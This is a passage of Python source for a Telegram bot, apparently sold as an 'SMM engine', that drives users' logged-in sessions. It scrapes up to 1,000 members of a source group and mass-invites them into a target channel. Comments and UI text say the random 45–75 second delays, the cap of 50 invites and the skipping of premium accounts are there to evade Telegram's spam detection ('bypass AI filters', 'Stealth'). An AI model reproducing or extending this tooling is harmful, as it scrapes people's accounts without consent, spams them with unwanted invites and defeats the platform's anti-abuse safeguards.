        client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
        try:
            await client.connect()
            
            # Resolve entity to ensure the destination exists
            entity = await client.get_entity(input_text)
            
            # 1. Fetch Full Metadata (Subscribers & Capacity)
            full_chat = await client(functions.channels.GetFullChannelRequest(channel=entity))
            sub_count = full_chat.full_chat.participants_count
            
            # 2. Capacity Audit
            # Warning only; Telegram restricts adding members if the channel > 200 subs 
            # unless the worker is a specific type of admin.
            capacity_warning = ""
            if sub_count >= 200:
                capacity_warning = f"\n⚠️ <b>Notice:</b> Channel size ({sub_count}) may restrict bot-driven invites."

            # 3. Permission Audit (CRITICAL: Verifies 'Add Members' rights)
            p_req = await client(functions.channels.GetParticipantRequest(channel=entity, participant='me'))
            p_info = p_req.participant
            
            has_rights = False
            if isinstance(p_info, tl_types.ChannelParticipantCreator):
                has_rights = True
            elif isinstance(p_info, tl_types.ChannelParticipantAdmin):
                if p_info.admin_rights.invite_users:
                    has_rights = True

            if not has_rights:
                return await bot.edit_message_text(
                    "❌ <b>Rights Verification Failed:</b>\n"
                    "The worker account must have <b>'Add Members'</b> permissions in this channel.", 
                    m.chat.id, analysis_msg.message_id, parse_mode="HTML"
                )

            # 4. NeonDB Persistence (Syncing Section 4)
            await db.set_target_data(user_id, target=input_text)
            await db.update_state(user_id, "AWAITING_SOURCE")
            
            success_ui = (
                f"✅ <b>Target Channel Verified</b>\n"
                f"{UI_LINE}\n"
                f"📍 <b>Identity:</b> <code>{input_text}</code>\n"
                f"📊 <b>Current Size:</b> <code>{sub_count}</code> members\n"
                f"🛡️ <b>Permissions:</b> <code>Authorized</code>{capacity_warning}\n\n"
                f"📥 <b>STEP 2:</b> Now provide the <b>Source Group</b> @username to scrape from."
            )
            await bot.edit_message_text(success_ui, m.chat.id, analysis_msg.message_id, parse_mode="HTML")
            
        except Exception as e:
            logger.error(f"Analysis Crash: {e}")
            await bot.edit_message_text(f"❌ <b>Scan Error:</b>\n<code>{str(e)}</code>", m.chat.id, analysis_msg.message_id, parse_mode="HTML")
        finally:
            await client.disconnect()

    # ---------------------------------------------------------
    # STAGE 2: SOURCE GROUP CONFIGURATION (The Origin)
    # ---------------------------------------------------------
    elif state == "AWAITING_SOURCE":
        # Capture the scraping source (This supports any public group)
        await db.set_target_data(user_id, source=input_text)
        await db.update_state(user_id, "AWAITING_SEGMENT")
        
        # Deploy the Segment Selection Interface (Inline Buttons)
        markup = bot_types.InlineKeyboardMarkup()
        markup.row(
            bot_types.InlineKeyboardButton("🔥 Invite Active", callback_data="select_segment_active"),
            bot_types.InlineKeyboardButton("💤 Invite Inactive", callback_data="select_segment_inactive")
        )
        
        # Retrieve target for the confirmation UI
        target_name = user_data.get('target_channel', 'Unknown')
        
        config_ui = (
            f"📥 <b>Source Group Locked</b>\n"
            f"{UI_LINE}\n"
            f"📍 <b>Origin:</b> <code>{input_text}</code>\n"
            f"🎯 <b>Target:</b> <code>{target_name}</code>\n\n"
            f"🛠️ <b>Final Step:</b> Select the user segment you wish to extract from the source."
        )
        
        await bot.send_message(m.chat.id, config_ui, parse_mode="HTML", reply_markup=markup)
# =========================================================================
# --- 8. THE DYNAMIC BRIDGE & WORKER ENGINE (TITAN-ASYNC V8.8) ---
# =========================================================================

@bot.message_handler(regexp=r'^/group\s+@?\w+')
async def init_dynamic_scrape(message):
    """
    STAGE 1: DYNAMIC SOURCE CAPTURE
    The user initiates the process by targeting a source group.
    """
    try:
        # Extract and sanitize the group username provided in the command
        source_group = message.text.split()[1].replace("@", "").strip()
        user_id = message.from_user.id
        
        # Connect to NeonDB to update the user's current session state
        await db.connect()
        
        # Store the source group and set the state machine to wait for the target
        await db.execute_query(
            "UPDATE users SET source_group = $1, bot_state = $2 WHERE user_id = $3",
            source_group, "WAITING_FOR_TARGET", user_id
        )
        
        response = (
            f"🎯 <b>Source Group Locked:</b> <code>@{source_group}</code>\n"
            f"{UI_LINE}\n"
            f"📥 <b>Next Step:</b> Please send the <b>Target Channel @username</b>\n"
            f"<i>The engine will bridge members from the source to your target.</i>"
        )
        await bot.reply_to(message, response, parse_mode="HTML")
        
    except (IndexError, Exception) as e:
        logger.error(f"Dynamic Scrape Error: {e}")
        await bot.reply_to(message, "❌ <b>Format Error:</b> Use <code>/group @GroupUsername</code>")

@bot.message_handler(func=lambda m: True)
async def handle_dynamic_inputs(message):
    """
    STAGE 2: TARGET CAPTURE & STRATEGY SELECTION
    This catches the next text message from the user to define the target channel.
    """
    user_id = message.from_user.id
    await db.connect()
    user_data = await db.get_user(user_id)
    
    # If the bot is not expecting a target, we ignore this as regular text
    if not user_data or user_data['bot_state'] != "WAITING_FOR_TARGET":
        return

    # Process the Target Channel Input
    target_channel = message.text.replace("@", "").strip()
    
    # Update database with the target channel and transition to segment choice
    await db.execute_query(
        "UPDATE users SET target_channel = $1, bot_state = $2 WHERE user_id = $3",
        target_channel, "SELECTING_SEGMENT", user_id
    )
    
    # Generate the strategy selection UI
    markup = bot_types.InlineKeyboardMarkup()
    markup.row(
        bot_types.InlineKeyboardButton("🔥 ACTIVE", callback_data="select_segment_ACTIVE"),
        bot_types.InlineKeyboardButton("💤 INACTIVE", callback_data="select_segment_INACTIVE")
    )
    
    setup_text = (
        f"✅ <b>Bridge Configuration Success!</b>\n"
        f"{UI_LINE}\n"
        f"📤 <b>Source:</b> <code>@{user_data['source_group']}</code>\n"
        f"📥 <b>Target:</b> <code>@{target_channel}</code>\n\n"
        f"<b>Select your member targeting strategy:</b>"
    )
    await bot.send_message(message.chat.id, setup_text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("select_segment_"))
async def handle_segment_selection(call):
    """
    STAGE 3: TARGETING OVERRIDE & UI PREPARATION
    Finalizes the choice of segment (Active/Inactive) before ignition.
    """
    segment = call.data.replace("select_segment_", "")
    user_id = call.from_user.id
    
    await db.connect()
    # Transition the state to READY to enable the deployment button
    await db.update_state(user_id, f"READY_{segment}")
    
    markup = bot_types.InlineKeyboardMarkup()
    markup.add(bot_types.InlineKeyboardButton("🚀 DEPLOY TITAN WORKER", callback_data="deploy_worker"))
    
    status_ui = (
        f"🎯 <b>Segment Locked:</b> <code>{segment.upper()}</code>\n"
        f"{UI_LINE}\n"
        f"🛡️ <b>Strategy:</b> Anti-Premium / 2026 Stealth\n"
        f"⚙️ <b>Engine:</b> Titan-Async V8.8 Primed\n\n"
        f"<i>Deployment is authorized. Press below to ignite the worker.</i>"
    )
    
    await bot.edit_message_text(status_ui, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "deploy_worker")
async def execute_smm_sequence(call):
    """
    STAGE 4: ENGINE IGNITION & WORKER DISPATCH
    Validates state and spawns the non-blocking background worker.
    """
    user_id = call.from_user.id
    await db.connect()
    user_data = await db.get_user(user_id)
    
    # Prevent execution if the state isn't READY
    if not user_data or "READY" not in user_data['bot_state']:
        return await bot.answer_callback_query(call.id, "⚠️ Error: Please complete setup first.", show_alert=True)
        
    await bot.edit_message_text(
        "🚀 <b>WORKER DEPLOYED:</b> Initializing Telethon Handshake...\n"
        "<i>Establishing secure node connection...</i>", 
        call.message.chat.id, call.message.message_id, parse_mode="HTML"
    )
    
    # Lock the user into WORKING state to prevent double-threads
    await db.update_state(user_id, "WORKING")
    
    # Spawn the heavy logic as a background task to keep the bot responsive
    asyncio.create_task(background_invite_task(call.message.chat.id, user_data))

async def background_invite_task(chat_id, user_data):
    """
    STAGE 5: CORE WORKER EXECUTION (THE ENGINE)
    This handles the scraping, filtering, and actual invitation process.
    """
    # Create the client using the saved StringSession
    client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            logger.error(f"Worker {user_data['user_id']} Auth Expired.")
            return await bot.send_message(chat_id, "❌ <b>Session Expired:</b> Link again via /start.")

        # --- PERMISSION & ENTITY HANDSHAKE ---
        try:
            source_ent = await client.get_entity(user_data['source_group'])
            target_ent = await client.get_entity(user_data['target_channel'])
            
            # Diagnostic: Verify if members are visible (Hidden Member Fix)
            source_info = await client(functions.channels.GetFullChannelRequest(channel=source_ent))
            if not source_info.full_chat.can_view_participants:
                return await bot.send_message(chat_id, "⚠️ <b>Analysis Error:</b> This group hides its member list.")
        except Exception as e:
            logger.error(f"Handshake Failure: {e}")
            return await bot.send_message(chat_id, "❌ <b>Entity Error:</b> Worker must be in the source group.")

        # --- PHASE 1: NEURAL SCRAPING & FILTERING ---
        status_msg = await bot.send_message(chat_id, "🔍 <b>Scraping Metadata...</b>", parse_mode="HTML")
        participants = await client.get_participants(source_ent, limit=1000)
        
        targets = []
        is_active_mode = "ACTIVE" in user_data['bot_state']
        
        for p in participants:
            # Skip non-invitable system accounts
            if p.bot or p.deleted: continue
            # Anti-Premium Shield: Skip premium accounts to save worker health
            if getattr(p, 'premium', False): continue
            
            status = p.status
            # Segment separation logic
            if is_active_mode and isinstance(status, (tl_types.UserStatusRecently, tl_types.UserStatusOnline)):
                targets.append(p)
            elif not is_active_mode and not isinstance(status, (tl_types.UserStatusRecently, tl_types.UserStatusOnline)):
                targets.append(p)

        # Safety Cap: Max 50 invites per run to avoid 2026 detection
        final_targets = targets[:50] 
        total_count = len(final_targets)

        if total_count == 0:
            return await bot.edit_message_text("❌ <b>Zero Targets:</b> No users found with these filters.", chat_id, status_msg.message_id)

        # --- PHASE 2: PACKET DISPATCH & TELEMETRY ---
        await bot.edit_message_text(f"⚡ <b>Engine:</b> Found {len(targets)} users. Transferring {total_count}...", chat_id, status_msg.message_id, parse_mode="HTML")

        success, fail = 0, 0
        for index, user in enumerate(final_targets):
            try:
                # Targeted Invitation Dispatch to TARGET CHANNEL
                await client(functions.channels.InviteToChannelRequest(target_ent, [user.id]))
                success += 1
            except errors.FloodWaitError as e:
                await bot.send_message(chat_id, f"⏳ <b>Flood Triggered:</b> Cooling down for {e.seconds}s.")
                await asyncio.sleep(e.seconds)
            except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError):
                fail += 1
            except Exception as e:
                logger.warning(f"Invite skip for user {user.id}: {e}")
                fail += 1

            # --- PHASE 3: TELEMETRY UI REFRESH ---
            if (index + 1) % 5 == 0 or (index + 1) == total_count:
                bar = generate_progress_bar(index + 1, total_count)
                progress_ui = (
                    f"🚀 <b>Vinzy Engine Activity</b>\n{UI_LINE}\n"
                    f"📊 <b>Progress:</b> {index + 1}/{total_count}\n{bar}\n\n"
                    f"✅ Success: <code>{success}</code> | ❌ Restricted: <code>{fail}</code>\n"
                    f"🛡️ <b>Stealth Latency:</b> Active"
                )
                await bot.edit_message_text(progress_ui, chat_id, status_msg.message_id, parse_mode="HTML")
            
            # Stealth Latency: Random delay between 45-75s to bypass AI filters
            if (index + 1) < total_count:
                await asyncio.sleep(random.randint(45, 75))

        # --- PHASE 4: FINALIZATION ---
        final_report = (
            f"🏁 <b>Mission Accomplished!</b>\n"
            f"{UI_LINE}\n"
            f"✅ <b>Total Added:</b> <code>{success}</code>\n"
            f"⚠️ <b>Privacy Skips:</b> <code>{fail}</code>\n\n"
            f"Your worker session is now resting. {VINZY_ASCII}"
        )
        await bot.send_message(chat_id, final_report, parse_mode="HTML")

    except Exception as fatal_err:
        logger.critical(f"FATAL WORKER ENGINE ERROR: {fatal_err}")
        await bot.send_message(chat_id, f"🚨 <b>Critical Engine Failure:</b> Check your Target permissions.")
    
    finally:
        # Revert state so user can start a new run
        await db.update_state(user_data['user_id'], "IDLE")
        await client.disconnect()
        logger.info(f"Worker node for {user_data['user_id']} decommissioned.")

# =========================================================================
# --- 9. APPLICATION RUNTIME & CRASH PROTECTION (TITAN-ASYNC V8.5) ---
# =========================================================================

async def main():
    """
    SYSTEM HEARTBEAT:
    The primary entry point for the Vinzy SMM Engine. 
    Handles initial handshakes, database synchronization, and the infinite polling loop.
    """
    # Professional Enterprise Boot Banner
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("   🚀 VINZY SMM ENGINE V8.5 - ENTERPRISE EDITION")
    print(f"   📅 BOOT TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("   📡 INFRASTRUCTURE: NEONDB + KOYEB HYPER-SCALE")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    logger.info("📡 System Ignition: Initializing NeonDB Handshake...")
    
    try:
        # Step 1: Establish Database Connectivity
        # This must happen before polling to ensure user states can be read immediately
        await db.connect()
        logger.info("✅ Database Engine: ONLINE (Connection Pool Primed)")
        
        # Step 2: Set Global Bot Commands (Optional but recommended for UI)
        # This ensures the menu button is visible as soon as the bot boots
        # await set_persistent_menu(ADMIN_LOG_GROUP) # Optional debug line
        
        logger.info("⚡ Polling Started: Awaiting Hardware Node signals...")
        
    except Exception as boot_err:
        logger.critical(f"🚨 BOOTSTRAP FAILURE: System cannot ignite. | {boot_err}")
        return

    # --- INFINITE RECOVERY LOOP ---
    # This loop ensures the bot stays online 24/7 on Koyeb, even during network drops.
    while True:
        try:
            # skip_pending=True: Ignores messages sent while the bot was offline.
            # timeout=120: Long-polling interval to reduce CPU usage.
            await bot.infinity_polling(
                skip_pending=True, 
                timeout=120, 
                request_timeout=150
            )
            
        except ApiTelegramException as e:
            # Error 409: Conflict (Usually means another instance is running)
            if e.error_code == 409:
                logger.warning("⚠️ System Conflict (409): Another instance detected. Hibernating 15s...")
                await asyncio.sleep(15)
            else:
                logger.error(f"🌐 Telegram API Error: {e}")
                await asyncio.sleep(5)
                
        except Exception as e:
            # General Crash Recovery (Network timeouts, proxy drops, etc.)
            logger.error(f"🔄 Engine Stalled: {e}. Attempting re-ignition in 15s...")
            await asyncio.sleep(15)

if __name__ == "__main__":
    """
    PROCESS WRAPPER:
    Manages the high-level execution and handles manual shutdowns.
    """
    try:
        # Launch the asynchronous event loop
        asyncio.run(main())
        
    except KeyboardInterrupt:
        # Graceful shutdown if you stop the script manually (CTRL+C)
        print("\n" + "━"*50)
        print("🔌 MANUAL SHUTDOWN: Vinzy Engine Disconnected.")
        print("━"*50)
        
    except Exception as fatal:
        # Final catch-all for system-level failures
        print(f"❌ KERNEL PANIC: {fatal}")
        sys.exit(1)
